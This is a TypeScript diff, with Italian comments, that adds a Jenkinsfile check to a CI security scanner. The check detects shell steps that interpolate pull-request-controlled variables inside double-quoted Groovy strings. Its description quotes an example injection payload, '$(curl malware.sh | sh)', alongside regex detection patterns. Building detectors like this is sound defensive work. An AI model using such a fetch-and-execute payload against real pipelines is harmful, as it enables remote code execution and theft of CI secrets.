@@ -13,6 +13,7 @@ import {
   isGithubActionsWorkflow,
   isGitlabCiFile,
   isCircleCiFile,
+  isJenkinsFile,
   nearbyMatches,
   redactLine,
 } from "../util/scan.js";
@@ -131,6 +132,17 @@ const CIRCLECI_RUN_INLINE = /^\s*-\s*run:\s*(.*)$/;
 // "command:" come sotto-chiave di un passo "- run:" in forma estesa — mai
 // preceduta da un trattino, a differenza della forma breve sopra.
 const CIRCLECI_COMMAND_KEY = /^(\s*)command:\s*(.*)$/;
+
+// In Groovy solo le stringhe tra doppi apici interpolano "${...}" — tra
+// apici singoli il testo resta letterale, quindi lo stesso valore dentro
+// sh('...') non è vulnerabile allo stesso modo. CHANGE_TITLE/CHANGE_BRANCH/
+// CHANGE_AUTHOR/CHANGE_URL sono variabili di una pipeline multibranch
+// scrivibili da chi apre la pull request; le variabili ghprb* vengono dal
+// plugin GitHub Pull Request Builder, stesso principio. Un titolo di PR
+// con dentro un comando shell finirebbe eseguito alla lettera in quel passo.
+const JENKINS_SH_STEP_DOUBLE_QUOTED = /^\s*(?:sh|bat|powershell)\s*\(?\s*(?:"""|")/;
+const JENKINS_DANGEROUS_VAR =
+  /\$\{?(?:env\.)?(?:CHANGE_TITLE|CHANGE_BRANCH|CHANGE_AUTHOR|CHANGE_URL|CHANGE_AUTHOR_EMAIL|ghprbPullTitle|ghprbSourceBranch|ghprbPullDescription|ghprbActualCommitAuthor)\b\}?/;
 
 // "pull_request_target" gira con i permessi e i segreti del repository di
 // base anche per una pull request da un fork esterno — a differenza di
@@ -1402,5 +1414,50 @@ export const criticalChecks: Check[] = [
     },
     // Nessun autofix: come per gitlab-ci-script-injection, il nome della
     // variabile d'ambiente giusta dipende da cosa fa davvero lo script.
+  },
+
+  {
+    id: "jenkins-pipeline-script-injection",
+    severity: "critical",
+    confidence: "confirmed",
+    title: "Un valore controllato da chi apre la pull request entra in un comando shell del Jenkinsfile",
+    description:
+      "Un passo \"sh\"/\"bat\"/\"powershell\" usa una stringa Groovy tra doppi apici (\"...\" o \"\"\"...\"\"\") che interpola direttamente una variabile come \"env.CHANGE_TITLE\" o \"ghprbPullTitle\" — entrambe scrivibili da chiunque apra la pull request, anche da un fork esterno. Groovy sostituisce il valore PRIMA che la shell lo veda: un titolo come \"$(curl malware.sh | sh)\" finirebbe eseguito alla lettera in quel passo, con accesso a tutti i segreti disponibili in quel job. Con gli apici singoli (sh('...')) lo stesso testo resterebbe letterale, perché Groovy non interpola dentro quelle stringhe.",
+    fix: {
+      before: `sh "deploy.sh \${env.CHANGE_TITLE}"`,
+      after: `sh "deploy.sh \${TITLE}"\n// impostato PRIMA del passo con: environment { TITLE = "\${env.CHANGE_TITLE}" }\n// e usato nello script come variabile d'ambiente, mai interpolato direttamente nella stringa Groovy`,
+    },
+    detect(file) {
+      if (!isJenkinsFile(file)) return [];
+      const matches: CheckMatch[] = [];
+      const lines = file.content.split("\n");
+
+      lines.forEach((lineText, idx) => {
+        const m = JENKINS_SH_STEP_DOUBLE_QUOTED.exec(lineText);
+        if (!m) return;
+
+        if (JENKINS_DANGEROUS_VAR.test(lineText)) {
+          matches.push({ line: idx + 1, snippet: redactLine(lineText, 0, lineText.length) });
+        }
+
+        const openCount = (lineText.match(/"""/g) ?? []).length;
+        const isUnclosedTriple = lineText.includes('"""') && openCount < 2;
+        if (!isUnclosedTriple) return;
+
+        // Stringa Groovy su più righe ("""...."""): continua a leggere finché
+        // non trova la tripla virgoletta di chiusura (o la fine del file).
+        for (let j = idx + 1; j < lines.length; j++) {
+          const next = lines[j];
+          if (JENKINS_DANGEROUS_VAR.test(next)) {
+            matches.push({ line: j + 1, snippet: redactLine(next, 0, next.length) });
+          }
+          if (next.includes('"""')) break;
+        }
+      });
+
+      return matches;
+    },
+    // Nessun autofix: come per gli altri controlli di injection nella CI, il
+    // nome della variabile d'ambiente giusta dipende da cosa fa davvero lo script.
   },
 ];
